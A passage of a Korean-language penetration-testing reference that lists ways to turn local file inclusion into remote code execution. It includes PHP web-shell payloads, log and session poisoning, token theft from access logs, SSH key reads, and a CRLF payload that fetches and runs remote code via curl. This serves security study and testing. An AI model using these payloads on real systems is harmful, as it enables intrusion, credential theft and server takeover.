많은 앱이 GET을 통해 session/auth tokens를 잘못 수용합니다 (예: AuthenticationToken, token, sid). web server logs에 대한 path traversal/LFI primitive가 있다면, access logs에서 해당 토큰을 훔쳐 재사용(replay)하여 authentication을 완전히 우회할 수 있습니다.

How-to:
- traversal/LFI를 사용해 web server access log를 읽으세요. 일반적인 위치:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- 일부 endpoints는 파일 읽기 결과를 Base64-encoded로 반환합니다. 그런 경우 로컬에서 디코드하고 로그 라인을 검사하세요.
- Grep으로 GET 요청 중 token parameter를 포함한 항목을 찾아 값을 추출한 뒤, 이를 application entry point에 replay하세요.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
본문이 Base64인 경우 디코드한 다음, 캡처한 token을 재사용하세요:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
참고:
- Tokens in URLs는 기본적으로 로그에 기록됩니다. 운영 시스템에서는 bearer tokens를 GET으로 절대 받지 마세요.
- 앱이 여러 token 이름을 지원하면 AuthenticationToken, token, sid, access_token 같은 일반적인 키를 찾아보세요.
- 로그에 leaked되었을 가능성이 있는 tokens는 즉시 rotate(교체)하세요.

### 이메일을 통해

**메일 보내기**: 내부 계정(user@localhost)으로 `<?php echo system($_REQUEST["cmd"]); ?>` 같은 PHP payload를 포함한 메일을 보내고, 사용자 메일을 include할 수 있는 경로(**`/var/mail/<USERNAME>`** 또는 **`/var/spool/mail/<USERNAME>`**)를 시도하세요.

### /proc/\*/fd/\*를 통해

1. 많은 shells를 업로드하세요(예: 100)
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)를 include하세요. 여기서 $PID는 프로세스의 PID (can be brute forced)이고, $FD는 파일 디스크립터 (can be brute forced too)입니다.

### /proc/self/environ를 통해

로그 파일처럼, User-Agent에 payload를 보내면 /proc/self/environ 파일에 반영됩니다.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### 업로드를 통해

파일을 업로드할 수 있다면, 단순히 shell payload를 그 안에 주입하세요 (예: `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
파일을 읽기 쉽게 유지하려면 pictures/doc/pdf의 메타데이터에 주입하는 것이 가장 좋습니다

### Zip 파일 업로드를 통해

압축된 PHP shell이 포함된 ZIP 파일을 업로드한 뒤 접근:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP 세션을 통해

웹사이트가 PHP Session (PHPSESSID)을 사용하는지 확인하세요.
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP에서는 이러한 세션이 _/var/lib/php5/sess\\_\[PHPSESSID]\_ 파일에 저장됩니다
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
cookie를 `<?php system('cat /etc/passwd');?>`로 설정하세요.
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI를 사용해 PHP 세션 파일을 포함하세요
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh를 통해

ssh가 활성화되어 있다면 어떤 사용자가 사용 중인지 (/proc/self/status & /etc/passwd) 확인하고 **\<HOME>/.ssh/id_rsa**에 접근해 보세요

### **를 통해** **vsftpd** _**logs**_

FTP 서버 vsftpd의 로그는 _**/var/log/vsftpd.log**_에 위치합니다. Local File Inclusion (LFI) 취약점이 존재하고 노출된 vsftpd 서버에 접근할 수 있는 경우, 다음 절차를 고려할 수 있습니다:

1. 로그인 과정에서 username 필드에 PHP payload를 주입하세요.
2. 주입 후 LFI를 이용해 서버 로그 _**/var/log/vsftpd.log**_를 가져오세요.

### php base64 filter (base64 사용)

[this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article에 나온 것처럼, PHP base64 filter는 Non-base64를 무시합니다. 이를 이용해 파일 확장자 체크를 우회할 수 있습니다: base64가 ".php"로 끝나도록 공급하면, filter는 "."를 무시하고 base64에 "php"를 붙입니다. 예시 payload는 다음과 같습니다:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### php filters를 통한 방법 (파일 필요 없음)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)explains that you can use **php filters to generate arbitrary content** as output. Which basically means that you can **generate arbitrary php code** for the include **without needing to write** it into a file.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### segmentation fault를 통한 방법

파일을 업로드하면 `/tmp`에 임시로 저장되는데, 같은 요청에서 segmentation fault를 유발하면 임시 파일이 삭제되지 않아 해당 파일을 찾을 수 있습니다.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx 임시 파일 저장소를 통한 방법

만약 **Local File Inclusion**를 발견했고 **Nginx**가 PHP 앞에서 동작한다면, 다음 기법으로 RCE를 얻을 수 있습니다:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS를 통한 방법

세션이 없고 `session.auto_start`가 `Off`인 상태에서도 **Local File Inclusion**을 발견했다면, multipart POST 데이터에 **`PHP_SESSION_UPLOAD_PROGRESS`**를 제공하면 PHP가 세션을 자동으로 활성화합니다. 이를 악용해 RCE를 얻을 수 있습니다:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows의 임시 파일 업로드를 통한 방법

만약 **Local File Inclusion**을 발견했고 서버가 **Windows**에서 동작한다면 RCE를 얻을 수 있습니다:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args를 통한 방법

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
다음은 CRLF vuln을 악용해 RCE를 얻는 예시입니다 (출처: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo() (file_uploads = on)을 통해

만약 **Local File Inclusion**를 발견했고 **phpinfo()**를 노출하며 file_uploads = on인 파일이 있다면 RCE를 얻을 수 있습니다:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure를 통해

만약 **Local File Inclusion**를 발견했고 임시 파일의 경로를 **exfiltrate**할 수 BUT **server**가 포함할 파일에 PHP 마크가 있는지 **checking**하고 있다면, 이 **Race Condition**으로 그 **check**를 **bypass**해 볼 수 있습니다:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce를 통해

만약 LFI를 악용해 **임시 파일을 upload**하고 서버가 PHP 실행을 **hang**하도록 만들 수 있다면, 그 후 몇 시간 동안 파일명을 **brute force**하여 임시 파일을 찾을 수 있습니다:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

만약 `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` 중 하나를 include하면 됩니다. (그 오류를 발생시키려면 동일한 파일을 2번 include해야 합니다).

**이게 어떻게 유용한지 잘 모르겠지만 가능성은 있습니다.**\
_PHP Fatal Error를 일으키더라도 업로드된 PHP 임시 파일들은 삭제됩니다._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


### 클라이언트에서 traversal 시퀀스 유지

일부 HTTP 클라이언트는 요청이 서버에 도달하기 전에 `../`를 정규화하거나 축소해서 directory traversal payloads를 깨뜨립니다. 로그/다운로드 엔드포인트가 사용자 제어 파일명을 연결(concatenate)할 때 traversal을 그대로 유지하려면 `curl --path-as-is`를 사용하고, `/proc` 같은 pseudo-files에 대해서는 `--ignore-content-length`를 추가하세요:
```bash
curl --path-as-is -b "session=$SESSION" \
"http://TARGET/admin/get_system_log?log_identifier=../../../../proc/self/environ" \
--ignore-content-length -s | tr '\000' '\n'
```
`../` 세그먼트의 수를 조정하여 의도한 디렉터리에서 벗어난 다음, `/etc/passwd`, `/proc/self/cwd/app.py` 또는 다른 소스/설정 파일을 덤프합니다.

## 참고자료

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [HTB: Imagery (admin log download traversal + `/proc/self/environ` read)](https://0xdf.gitlab.io/2026/01/24/htb-imagery.html)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
